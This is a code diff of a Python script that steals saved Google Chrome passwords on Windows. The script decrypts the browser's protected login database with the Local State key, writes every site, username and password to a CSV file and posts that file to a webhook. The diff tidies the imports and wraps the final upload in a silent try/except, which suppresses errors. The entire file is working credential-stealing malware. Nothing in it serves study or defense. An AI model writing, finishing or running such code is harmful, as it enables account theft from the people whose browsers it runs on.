@@ -1,12 +1,12 @@
-import requests
-import os 
+import os
+from Crypto.Cipher import AES
+from requests import post
+from sqlite3 import connect
+from csv import writer
 from base64 import b64decode
 from json import loads
 from win32crypt import CryptUnprotectData
-import sqlite3
-from Crypto.Cipher import AES
 from shutil import copyfile
-import csv
 
 webhookURL = ""
 CHROMEPATH = f"c:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data"
@@ -19,7 +19,7 @@ def sendToWebhook(fileToSend):
     data = {
         "file": (file.name, file.read())
     }
-    requests.post(webhookURL, data=data)
+    post(webhookURL, data=data)
 
 def getChromePasswordDencryptionKey(path):
     if not os.path.exists(f"{path}\\Local State"): return
@@ -42,7 +42,7 @@ def decryptPassword(password, key):
 def getChromePasswords():
     decryptionKey = getChromePasswordDencryptionKey(CHROMEPATH)
     exportedPasswordsFile = open("CDBEXP.csv", "w", newline="")
-    csvWriter = csv.writer(exportedPasswordsFile)
+    csvWriter = writer(exportedPasswordsFile)
     i = 0
     i2 = 1
 
@@ -52,7 +52,7 @@ def getChromePasswords():
             loginDataFile = f"{fullFilePath}\\Login Data"
             if os.path.exists(loginDataFile) and os.path.isfile(loginDataFile):
                 copiedLoginDataFile = copyfile(loginDataFile, f"Login Data {i}")
-                passwordsDB = sqlite3.connect(copiedLoginDataFile)
+                passwordsDB = connect(copiedLoginDataFile)
                 cursor = passwordsDB.cursor()
                 i += 1
 
@@ -74,4 +74,7 @@ def getChromePasswords():
     exportedPasswordsFile.close()
     return exportedPasswordsFile.name
 
-sendToWebhook(getChromePasswords())
+try:
+    sendToWebhook(getChromePasswords())
+except:
+    pass
